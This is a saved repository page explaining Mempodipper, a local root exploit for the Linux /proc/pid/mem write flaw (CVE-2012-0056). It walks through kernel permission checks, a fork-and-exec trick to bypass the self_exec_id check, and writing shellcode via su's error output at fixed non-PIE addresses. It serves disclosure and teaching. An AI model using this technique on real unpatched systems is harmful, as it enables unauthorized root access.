<!DOCTYPE html>
<!-- saved from url=(0042)https://git.zx2c4.com/CVE-2012-0056/about/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>CVE-2012-0056 - Mempodipper, a linux local root exploit.</title>
<meta name="generator" content="cgit v1.2.3-11-g984f">
<meta name="robots" content="index, nofollow">
<link rel="stylesheet" type="text/css" href="./2012 - Linux Local Privilege Escalation via SUID _proc_pid_mem Write_files/cgit.css">
<link rel="shortcut icon" href="https://git.zx2c4.com/favicon.ico">
<link rel="alternate" title="Atom feed" href="https://git.zx2c4.com/CVE-2012-0056/atom/?h=master" type="application/atom+xml">
<link rel="vcs-git" href="https://git.zx2c4.com/CVE-2012-0056" title="CVE-2012-0056 Git repository">
<link rel="vcs-git" href="git://git.zx2c4.com/CVE-2012-0056" title="CVE-2012-0056 Git repository">
<link rel="vcs-git" href="ssh://git@git.zx2c4.com/CVE-2012-0056" title="CVE-2012-0056 Git repository">
</head>
<body>
<div id="cgit"><table id="header">
<tbody><tr>
<td class="logo" rowspan="2"><a href="http://www.zx2c4.com/"><img src="./2012 - Linux Local Privilege Escalation via SUID _proc_pid_mem Write_files/cgit.png" alt="cgit logo"></a></td>
<td class="main"><a href="https://git.zx2c4.com/">index</a> : <a title="CVE-2012-0056" href="https://git.zx2c4.com/CVE-2012-0056/">CVE-2012-0056</a></td><td class="form"><form method="get">
<select name="h" onchange="this.form.submit();">
<option value="fedora">fedora</option>
<option value="master" selected="selected">master</option>
</select> <input type="submit" value="switch"></form></td></tr>
<tr><td class="sub">Mempodipper, a linux local root exploit.</td><td class="sub right">Jason A. Donenfeld</td></tr></tbody></table>
<table class="tabs"><tbody><tr><td>
<a class="active" href="https://git.zx2c4.com/CVE-2012-0056/about/">about</a><a href="https://git.zx2c4.com/CVE-2012-0056/">summary</a><a href="https://git.zx2c4.com/CVE-2012-0056/refs/">refs</a><a href="https://git.zx2c4.com/CVE-2012-0056/log/">log</a><a href="https://git.zx2c4.com/CVE-2012-0056/tree/">tree</a><a href="https://git.zx2c4.com/CVE-2012-0056/commit/">commit</a><a href="https://git.zx2c4.com/CVE-2012-0056/diff/">diff</a><a href="https://git.zx2c4.com/CVE-2012-0056/stats/">stats</a></td><td class="form"><form class="right" method="get" action="https://git.zx2c4.com/CVE-2012-0056/log/">
<select name="qt">
<option value="grep">log msg</option>
<option value="author">author</option>
<option value="committer">committer</option>
<option value="range">range</option>
</select>
<input class="txt" type="search" size="10" name="q" value="">
<input type="submit" value="search">
</form>
</td></tr></tbody></table>
<div class="content"><div id="summary">
<style>
.markdown-body {
    font-size: 14px;
    line-height: 1.6;
    overflow: hidden;
}
.markdown-body>*:first-child {
    margin-top: 0 !important;
}
.markdown-body>*:last-child {
    margin-bottom: 0 !important;
}
.markdown-body a.absent {
    color: #c00;
}
.markdown-body a.anchor {
    display: block;
    padding-left: 30px;
    margin-left: -30px;
    cursor: pointer;
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
}
.markdown-body h1, .markdown-body h2, .markdown-body h3, .markdown-body h4, .markdown-body h5, .markdown-body h6 {
    margin: 20px 0 10px;
    padding: 0;
    font-weight: bold;
    -webkit-font-smoothing: antialiased;
    cursor: text;
    position: relative;
}
.markdown-body h1 .mini-icon-link, .markdown-body h2 .mini-icon-link, .markdown-body h3 .mini-icon-link, .markdown-body h4 .mini-icon-link, .markdown-body h5 .mini-icon-link, .markdown-body h6 .mini-icon-link {
    display: none;
    color: #000;
}
.markdown-body h1:hover a.anchor, .markdown-body h2:hover a.anchor, .markdown-body h3:hover a.anchor, .markdown-body h4:hover a.anchor, .markdown-body h5:hover a.anchor, .markdown-body h6:hover a.anchor {
    text-decoration: none;
    line-height: 1;
    padding-left: 0;
    margin-left: -22px;
    top: 15%;
}
.markdown-body h1:hover a.anchor .mini-icon-link, .markdown-body h2:hover a.anchor .mini-icon-link, .markdown-body h3:hover a.anchor .mini-icon-link, .markdown-body h4:hover a.anchor .mini-icon-link, .markdown-body h5:hover a.anchor .mini-icon-link, .markdown-body h6:hover a.anchor .mini-icon-link {
    display: inline-block;
}
div#cgit .markdown-body h1 a.toclink, div#cgit .markdown-body h2 a.toclink, div#cgit .markdown-body h3 a.toclink, div#cgit .markdown-body h4 a.toclink, div#cgit .markdown-body h5 a.toclink, div#cgit .markdown-body h6 a.toclink {
    color: black;
}
.markdown-body h1 tt, .markdown-body h1 code, .markdown-body h2 tt, .markdown-body h2 code, .markdown-body h3 tt, .markdown-body h3 code, .markdown-body h4 tt, .markdown-body h4 code, .markdown-body h5 tt, .markdown-body h5 code, .markdown-body h6 tt, .markdown-body h6 code {
    font-size: inherit;
}
.markdown-body h1 {
    font-size: 28px;
    color: #000;
}
.markdown-body h2 {
    font-size: 24px;
    border-bottom: 1px solid #ccc;
    color: #000;
}
.markdown-body h3 {
    font-size: 18px;
}
.markdown-body h4 {
    font-size: 16px;
}
.markdown-body h5 {
    font-size: 14px;
}
.markdown-body h6 {
    color: #777;
    font-size: 14px;
}
.markdown-body p, .markdown-body blockquote, .markdown-body ul, .markdown-body ol, .markdown-body dl, .markdown-body table, .markdown-body pre {
    margin: 15px 0;
}
.markdown-body hr {
    background: transparent url("/dirty-shade.png") repeat-x 0 0;
    border: 0 none;
    color: #ccc;
    height: 4px;
    padding: 0;
}
.markdown-body>h2:first-child, .markdown-body>h1:first-child, .markdown-body>h1:first-child+h2, .markdown-body>h3:first-child, .markdown-body>h4:first-child, .markdown-body>h5:first-child, .markdown-body>h6:first-child {
    margin-top: 0;
    padding-top: 0;
}
.markdown-body a:first-child h1, .markdown-body a:first-child h2, .markdown-body a:first-child h3, .markdown-body a:first-child h4, .markdown-body a:first-child h5, .markdown-body a:first-child h6 {
    margin-top: 0;
    padding-top: 0;
}
.markdown-body h1+p, .markdown-body h2+p, .markdown-body h3+p, .markdown-body h4+p, .markdown-body h5+p, .markdown-body h6+p {
    margin-top: 0;
}
.markdown-body li p.first {
    display: inline-block;
}
.markdown-body ul, .markdown-body ol {
    padding-left: 30px;
}
.markdown-body ul.no-list, .markdown-body ol.no-list {
    list-style-type: none;
    padding: 0;
}
.markdown-body ul li>:first-child, .markdown-body ul li ul:first-of-type, .markdown-body ul li ol:first-of-type, .markdown-body ol li>:first-child, .markdown-body ol li ul:first-of-type, .markdown-body ol li ol:first-of-type {
    margin-top: 0px;
}
.markdown-body ul li p:last-of-type, .markdown-body ol li p:last-of-type {
    margin-bottom: 0;
}
.markdown-body ul ul, .markdown-body ul ol, .markdown-body ol ol, .markdown-body ol ul {
    margin-bottom: 0;
}
.markdown-body dl {
    padding: 0;
}
.markdown-body dl dt {
    font-size: 14px;
    font-weight: bold;
    font-style: italic;
    padding: 0;
    margin: 15px 0 5px;
}
.markdown-body dl dt:first-child {
    padding: 0;
}
.markdown-body dl dt>:first-child {
    margin-top: 0px;
}
.markdown-body dl dt>:last-child {
    margin-bottom: 0px;
}
.markdown-body dl dd {
    margin: 0 0 15px;
    padding: 0 15px;
}
.markdown-body dl dd>:first-child {
    margin-top: 0px;
}
.markdown-body dl dd>:last-child {
    margin-bottom: 0px;
}
.markdown-body blockquote {
    border-left: 4px solid #DDD;
    padding: 0 15px;
    color: #777;
}
.markdown-body blockquote>:first-child {
    margin-top: 0px;
}
.markdown-body blockquote>:last-child {
    margin-bottom: 0px;
}
.markdown-body table th {
    font-weight: bold;
}
.markdown-body table th, .markdown-body table td {
    border: 1px solid #ccc;
    padding: 6px 13px;
}
.markdown-body table tr {
    border-top: 1px solid #ccc;
    background-color: #fff;
}
.markdown-body table tr:nth-child(2n) {
    background-color: #f8f8f8;
}
.markdown-body img {
    max-width: 100%;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.markdown-body span.frame {
    display: block;
    overflow: hidden;
}
.markdown-body span.frame>span {
    border: 1px solid #ddd;
    display: block;
    float: left;
    overflow: hidden;
    margin: 13px 0 0;
    padding: 7px;
    width: auto;
}
.markdown-body span.frame span img {
    display: block;
    float: left;
}
.markdown-body span.frame span span {
    clear: both;
    color: #333;
    display: block;
    padding: 5px 0 0;
}
.markdown-body span.align-center {
    display: block;
    overflow: hidden;
    clear: both;
}
.markdown-body span.align-center>span {
    display: block;
    overflow: hidden;
    margin: 13px auto 0;
    text-align: center;
}
.markdown-body span.align-center span img {
    margin: 0 auto;
    text-align: center;
}
.markdown-body span.align-right {
    display: block;
    overflow: hidden;
    clear: both;
}
.markdown-body span.align-right>span {
    display: block;
    overflow: hidden;
    margin: 13px 0 0;
    text-align: right;
}
.markdown-body span.align-right span img {
    margin: 0;
    text-align: right;
}
.markdown-body span.float-left {
    display: block;
    margin-right: 13px;
    overflow: hidden;
    float: left;
}
.markdown-body span.float-left span {
    margin: 13px 0 0;
}
.markdown-body span.float-right {
    display: block;
    margin-left: 13px;
    overflow: hidden;
    float: right;
}
.markdown-body span.float-right>span {
    display: block;
    overflow: hidden;
    margin: 13px auto 0;
    text-align: right;
}
.markdown-body code, .markdown-body tt {
    margin: 0 2px;
    padding: 0px 5px;
    border: 1px solid #eaeaea;
    background-color: #f8f8f8;
    border-radius: 3px;
}
.markdown-body code {
    white-space: nowrap;
}
.markdown-body pre>code {
    margin: 0;
    padding: 0;
    white-space: pre;
    border: none;
    background: transparent;
}
.markdown-body .highlight pre, .markdown-body pre {
    background-color: #f8f8f8;
    border: 1px solid #ccc;
    font-size: 13px;
    line-height: 19px;
    overflow: auto;
    padding: 6px 10px;
    border-radius: 3px;
}
.markdown-body pre code, .markdown-body pre tt {
    margin: 0;
    padding: 0;
    background-color: transparent;
    border: none;
}
pre { line-height: 125%; }
td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
.highlight .hll { background-color: #ffffcc }
.highlight { background: #ffffff; }
.highlight .c { color: #888888 } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { color: #008800; font-weight: bold } /* Keyword */
.highlight .ch { color: #888888 } /* Comment.Hashbang */
.highlight .cm { color: #888888 } /* Comment.Multiline */
.highlight .cp { color: #cc0000; font-weight: bold } /* Comment.Preproc */
.highlight .cpf { color: #888888 } /* Comment.PreprocFile */
.highlight .c1 { color: #888888 } /* Comment.Single */
.highlight .cs { color: #cc0000; font-weight: bold; background-color: #fff0f0 } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #333333 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #666666 } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { color: #008800; font-weight: bold } /* Keyword.Constant */
.highlight .kd { color: #008800; font-weight: bold } /* Keyword.Declaration */
.highlight .kn { color: #008800; font-weight: bold } /* Keyword.Namespace */
.highlight .kp { color: #008800 } /* Keyword.Pseudo */
.highlight .kr { color: #008800; font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #888888; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #0000DD; font-weight: bold } /* Literal.Number */
.highlight .s { color: #dd2200; background-color: #fff0f0 } /* Literal.String */
.highlight .na { color: #336699 } /* Name.Attribute */
.highlight .nb { color: #003388 } /* Name.Builtin */
.highlight .nc { color: #bb0066; font-weight: bold } /* Name.Class */
.highlight .no { color: #003366; font-weight: bold } /* Name.Constant */
.highlight .nd { color: #555555 } /* Name.Decorator */
.highlight .ne { color: #bb0066; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #0066bb; font-weight: bold } /* Name.Function */
.highlight .nl { color: #336699; font-style: italic } /* Name.Label */
.highlight .nn { color: #bb0066; font-weight: bold } /* Name.Namespace */
.highlight .py { color: #336699; font-weight: bold } /* Name.Property */
.highlight .nt { color: #bb0066; font-weight: bold } /* Name.Tag */
.highlight .nv { color: #336699 } /* Name.Variable */
.highlight .ow { color: #008800 } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mb { color: #0000DD; font-weight: bold } /* Literal.Number.Bin */
.highlight .mf { color: #0000DD; font-weight: bold } /* Literal.Number.Float */
.highlight .mh { color: #0000DD; font-weight: bold } /* Literal.Number.Hex */
.highlight .mi { color: #0000DD; font-weight: bold } /* Literal.Number.Integer */
.highlight .mo { color: #0000DD; font-weight: bold } /* Literal.Number.Oct */
.highlight .sa { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Affix */
.highlight .sb { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Backtick */
.highlight .sc { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Char */
.highlight .dl { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Delimiter */
.highlight .sd { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Doc */
.highlight .s2 { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Double */
.highlight .se { color: #0044dd; background-color: #fff0f0 } /* Literal.String.Escape */
.highlight .sh { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Heredoc */
.highlight .si { color: #3333bb; background-color: #fff0f0 } /* Literal.String.Interpol */
.highlight .sx { color: #22bb22; background-color: #f0fff0 } /* Literal.String.Other */
.highlight .sr { color: #008800; background-color: #fff0ff } /* Literal.String.Regex */
.highlight .s1 { color: #dd2200; background-color: #fff0f0 } /* Literal.String.Single */
.highlight .ss { color: #aa6600; background-color: #fff0f0 } /* Literal.String.Symbol */
.highlight .bp { color: #003388 } /* Name.Builtin.Pseudo */
.highlight .fm { color: #0066bb; font-weight: bold } /* Name.Function.Magic */
.highlight .vc { color: #336699 } /* Name.Variable.Class */
.highlight .vg { color: #dd7700 } /* Name.Variable.Global */
.highlight .vi { color: #3333bb } /* Name.Variable.Instance */
.highlight .vm { color: #336699 } /* Name.Variable.Magic */
.highlight .il { color: #0000DD; font-weight: bold } /* Literal.Number.Integer.Long */
</style>   
<div class="markdown-body"><h1 id="linux-local-privilege-escalation-via-suid-procpidmem-write"><a class="toclink" href="https://git.zx2c4.com/CVE-2012-0056/about/#linux-local-privilege-escalation-via-suid-procpidmem-write">Linux Local Privilege Escalation via SUID /proc/pid/mem Write</a></h1>
<h2 id="mempodipper"><a class="toclink" href="https://git.zx2c4.com/CVE-2012-0056/about/#mempodipper">Mempodipper</a></h2>
<p>Introducing <a href="http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c">Mempodipper</a>, an exploit for CVE-2012-0056. <tt>/proc/<i>pid</i>/mem</tt> is an interface for reading and writing, directly, process memory by seeking around with the same addresses as the process's virtual memory space. In 2.6.39, the protections against unauthorized access to <tt>/proc/<i>pid</i>/mem</tt> were deemed sufficient, and so the prior <tt>#ifdef</tt> that prevented write support for writing to arbitrary process memory <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=198214a7">was removed</a>. Anyone with the correct permissions could write to process memory. It turns out, of course, that the permissions checking was done poorly. <i>This means that all Linux kernels &gt;=2.6.39 are vulnerable</i>, up until the <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=e268337dfe26dfc7efd422a804dbb27977a3cccc">fix commit for it</a> a couple days ago. Let's take the old kernel code step by step and learn what's the matter with it.</p>
<p>When <tt>/proc/<i>pid</i>/mem</tt> is opened, this kernel code is called:</p>
<div class="highlight"><pre><span></span><code><span class="n">static</span> <span class="n">int</span> <span class="n">mem_open</span><span class="p">(</span><span class="n">struct</span> <span class="n">inode</span><span class="o">*</span> <span class="n">inode</span><span class="p">,</span> <span class="n">struct</span> <span class="n">file</span><span class="o">*</span> <span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="n">void</span><span class="o">*</span><span class="p">)((</span><span class="n">long</span><span class="p">)</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">self_exec_id</span><span class="p">);</span>
    <span class="cm">/* OK to pass negative loff_t, we can catch out-of-range */</span>
    <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">|=</span> <span class="n">FMODE_UNSIGNED_OFFSET</span><span class="p">;</span>
    <span class="kr">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>There are no restrictions on opening; anyone can open the <tt>/proc/<i>pid</i>/mem</tt> <a href="http://en.wikipedia.org/wiki/File_descriptor">fd</a> for any process (subject to the ordinary VFS restrictions). It simply makes note of the original process's <tt>self_exec_id</tt> that it was opened with and stores this away for checking later during reads and writes.</p>
<p>Writes (and reads), however, have permissions checking restrictions. Let's take a look at the write function:</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="n">ssize_t</span> <span class="n">mem_write</span><span class="p">(</span><span class="n">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="nb">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
             <span class="n">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>

<span class="o">/*</span> <span class="n">unimportant</span> <span class="n">code</span> <span class="n">removed</span> <span class="k">for</span> <span class="n">blog</span> <span class="n">post</span> <span class="o">*/</span>

    <span class="n">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span> <span class="o">=</span> <span class="n">get_proc_task</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="o">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>

<span class="o">/*</span> <span class="n">unimportant</span> <span class="n">code</span> <span class="n">removed</span> <span class="k">for</span> <span class="n">blog</span> <span class="n">post</span> <span class="o">*/</span>

    <span class="n">mm</span> <span class="o">=</span> <span class="n">check_mem_permission</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="n">copied</span> <span class="o">=</span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">mm</span><span class="p">))</span>
        <span class="n">goto</span> <span class="n">out_free</span><span class="p">;</span>

<span class="o">/*</span> <span class="n">unimportant</span> <span class="n">code</span> <span class="n">removed</span> <span class="k">for</span> <span class="n">blog</span> <span class="n">post</span> <span class="o">*/</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">!=</span> <span class="p">(</span><span class="n">void</span> <span class="o">*</span><span class="p">)((</span><span class="n">long</span><span class="p">)</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">self_exec_id</span><span class="p">))</span>
        <span class="n">goto</span> <span class="n">out_mm</span><span class="p">;</span>

<span class="o">/*</span> <span class="n">unimportant</span> <span class="n">code</span> <span class="n">removed</span> <span class="k">for</span> <span class="n">blog</span> <span class="n">post</span>
 <span class="o">*</span> <span class="p">(</span><span class="n">the</span> <span class="n">function</span> <span class="n">here</span> <span class="n">goes</span> <span class="n">onto</span> <span class="n">write</span> <span class="n">the</span> <span class="n">buffer</span> <span class="n">into</span> <span class="n">the</span> <span class="n">memory</span><span class="p">)</span>
 <span class="o">*/</span>
</code></pre></div>

<p>So there are two relevant checks in place to prevent against unauthorized writes: <tt>check_mem_permission</tt> and <tt>self_exec_id</tt>. Let's do the first one first and second one second.</p>
<p>The code of <tt>check_mem_permission</tt> simply calls into <tt>__check_mem_permission</tt>, so here's the code of that:</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="n">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">__check_mem_permission</span><span class="p">(</span><span class="n">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>

    <span class="n">mm</span> <span class="o">=</span> <span class="n">get_task_mm</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mm</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EINVAL</span><span class="p">);</span>

    <span class="o">/*</span>
     <span class="o">*</span> <span class="n">A</span> <span class="n">task</span> <span class="n">can</span> <span class="n">always</span> <span class="n">look</span> <span class="n">at</span> <span class="n">itself</span><span class="p">,</span> <span class="ow">in</span> <span class="n">case</span> <span class="n">it</span> <span class="n">chooses</span>
     <span class="o">*</span> <span class="n">to</span> <span class="n">use</span> <span class="n">system</span> <span class="n">calls</span> <span class="n">instead</span> <span class="n">of</span> <span class="nb">load</span> <span class="n">instructions</span><span class="o">.</span>
     <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">task</span> <span class="o">==</span> <span class="n">current</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">mm</span><span class="p">;</span>

    <span class="o">/*</span>
     <span class="o">*</span> <span class="n">If</span> <span class="n">current</span> <span class="k">is</span> <span class="n">actively</span> <span class="n">ptrace</span><span class="s1">'ing, and would also be</span>
     <span class="o">*</span> <span class="n">permitted</span> <span class="n">to</span> <span class="n">freshly</span> <span class="n">attach</span> <span class="n">with</span> <span class="n">ptrace</span> <span class="n">now</span><span class="p">,</span> <span class="n">permit</span> <span class="n">it</span><span class="o">.</span>
     <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">task_is_stopped_or_traced</span><span class="p">(</span><span class="n">task</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb nb-Type">int</span> <span class="k">match</span><span class="p">;</span>
        <span class="n">rcu_read_lock</span><span class="p">();</span>
        <span class="k">match</span> <span class="o">=</span> <span class="p">(</span><span class="n">ptrace_parent</span><span class="p">(</span><span class="n">task</span><span class="p">)</span> <span class="o">==</span> <span class="n">current</span><span class="p">);</span>
        <span class="n">rcu_read_unlock</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">match</span> <span class="o">&amp;&amp;</span> <span class="n">ptrace_may_access</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">PTRACE_MODE_ATTACH</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">mm</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">/*</span>
     <span class="o">*</span> <span class="n">No</span> <span class="n">one</span> <span class="k">else</span> <span class="k">is</span> <span class="n">allowed</span><span class="o">.</span>
     <span class="o">*/</span>
    <span class="n">mmput</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EPERM</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>There are two ways that the memory write is authorized. Either <tt>task == current</tt>, meaning that the process being written to is the process writing, or <tt>current</tt> (the process writing) has esoteric ptrace-level permissions to play with <tt>task</tt> (the process being written to). Maybe you think you can trick the ptrace code? It's tempting. But I don't know. Let's instead figure out how we can make a process write arbitrary memory to itself, so that <tt>task == current</tt>.</p>
<p>Now naturally, we want to write into the memory of <a href="http://en.wikipedia.org/wiki/Setuid">suid processes</a>, since then we can get root. Take a look at this:</p>
<div class="highlight"><pre><span></span><code>$ su <span class="s2">"yeeeee haw I am a cowboy"</span>
Unknown id: yeeeee haw I am a cowboy
</code></pre></div>

<p><tt>su</tt> will spit out whatever text you want onto stderr, prefixed by "Unknown id:". So, we can open a fd to <tt>/proc/self/mem</tt>, <tt>lseek</tt> to the right place in memory for writing (more on that later), use <a href="http://en.wikipedia.org/wiki/Redirection_(computing)"><tt>dup2</tt></a> to couple together stderr and the mem fd, and then <a href="http://en.wikipedia.org/wiki/Exec_(operating_system)"><tt>exec</tt></a> to <tt>su $shellcode</tt> to write an shell spawner to the process memory, and then we have root. Really? Not so easy.</p>
<p>Here the other restriction comes into play. After it passes the <tt>task == current</tt> test, it then checks to see if the current <tt>self_exec_id</tt> matches the <tt>self_exec_id</tt> that the fd was opened with. What on earth is <tt>self_exec_id</tt>? It's <a href="http://lxr.linux.no/linux+v3.2.1/+search?search=self_exec_id">only referenced a few places</a> in the kernel. The most important one happens to be inside of <tt>exec</tt>:</p>
<div class="highlight"><pre><span></span><code><span class="n">void</span> <span class="n">setup_new_exec</span><span class="p">(</span><span class="n">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span> <span class="n">bprm</span><span class="p">)</span>
<span class="p">{</span>
<span class="o">/*</span> <span class="n">massive</span> <span class="n">amounts</span> <span class="n">of</span> <span class="n">code</span> <span class="n">trimmed</span> <span class="k">for</span> <span class="n">the</span> <span class="n">purpose</span> <span class="n">of</span> <span class="n">this</span> <span class="n">blog</span> <span class="n">post</span> <span class="o">*/</span>

    <span class="o">/*</span> <span class="n">An</span> <span class="n">exec</span> <span class="n">changes</span> <span class="n">our</span> <span class="n">domain</span><span class="o">.</span> <span class="n">We</span> <span class="n">are</span> <span class="n">no</span> <span class="n">longer</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">thread</span>
       <span class="n">group</span> <span class="o">*/</span>

    <span class="n">current</span><span class="o">-&gt;</span><span class="n">self_exec_id</span><span class="o">++</span><span class="p">;</span>

    <span class="n">flush_signal_handlers</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">flush_old_files</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">files</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">setup_new_exec</span><span class="p">);</span>
</code></pre></div>

<p><tt>self_exec_id</tt> is incremented each time a process <tt>exec</tt>s. So in this case, it functions so that you can't open the fd in a non-suid process, <tt>dup2</tt>, and then <tt>exec</tt> to a suid process... which is exactly what we were trying to do above. Pretty clever way of deterring our attack, eh?</p>
<p>Here's how to get around it. We fork a child, and inside of that child, we <tt>exec</tt> to <i>a new process</i>. The initial child fork has a <tt>self_exec_id</tt> equal to its parent. When we <tt>exec</tt> to a new process, <tt>self_exec_id</tt> increments by one. Meanwhile, the parent itself is busy <tt>exec</tt>ing to our shellcode writing <tt>su</tt> process, so its <tt>self_exec_id</tt> gets incremented to the same value. So what we do is -- we make this child fork and <tt>exec</tt> to a new process, and inside of that new process, we <i>open up a fd to <tt>/proc/parent-pid/mem</tt> using the pid of the parent process, not our own process</i> (as was the case prior). We can open the fd like this because there is no permissions checking for a mere open. When it is opened, its <tt>self_exec_id</tt> has already incremented to the right value that the parent's <tt>self_exec_id</tt> will be when we <tt>exec</tt> to <tt>su</tt>. So finally, we pass our opened fd from the child process back to the parent process (using some <a href="http://archives.neohapsis.com/archives/postfix/2000-09/1476.html">very black unix domain sockets magic</a>), do our <tt>dup2</tt>ing, and <tt>exec</tt> into <tt>su</tt> with the shell code.</p>
<p>There is one remaining objection. Where do we write to? We have to <tt>lseek</tt> to the proper memory location before writing, and <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> randomizes processes address spaces making it impossible to know where to write to. Should we spend time working on more cleverness to figure out how to read process memory, and then carry out a search? No. Check this out:</p>
<div class="highlight"><pre><span></span><code>$ readelf -h /bin/su <span class="p">|</span> grep Type
   Type:                              EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</code></pre></div>

<p>This means that <tt>su</tt> does not have a relocatable .text section (otherwise it would spit out "DYN" instead of "EXEC"). It turns out that <tt>su</tt> on the vast majority of distros is <i>not compiled with <a href="http://en.wikipedia.org/wiki/Position-independent_code">PIE</a></i>, disabling ASLR for the .text section of the binary! So we've chosen <tt>su</tt> wisely. The offsets in memory will always be the same. So to find the right place to write to, let's check out the assembly surrounding the printing of the "Unknown id: blabla" error message.</p>
<p>It gets the error string here:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="mi">403677</span><span class="err">:</span><span class="w">       </span><span class="n">ba</span><span class="w"> </span><span class="mi">05</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="err">$</span><span class="mh">0x5</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span><span class="w"></span>
<span class="w">  </span><span class="mi">40367</span><span class="nl">c</span><span class="p">:</span><span class="w">       </span><span class="n">be</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="mi">40</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="err">$</span><span class="mh">0x4064ff</span><span class="p">,</span><span class="o">%</span><span class="n">esi</span><span class="w"></span>
<span class="w">  </span><span class="mi">403681</span><span class="err">:</span><span class="w">       </span><span class="mi">31</span><span class="w"> </span><span class="n">ff</span><span class="w">                   </span><span class="n">xor</span><span class="w">    </span><span class="o">%</span><span class="n">edi</span><span class="p">,</span><span class="o">%</span><span class="n">edi</span><span class="w"></span>
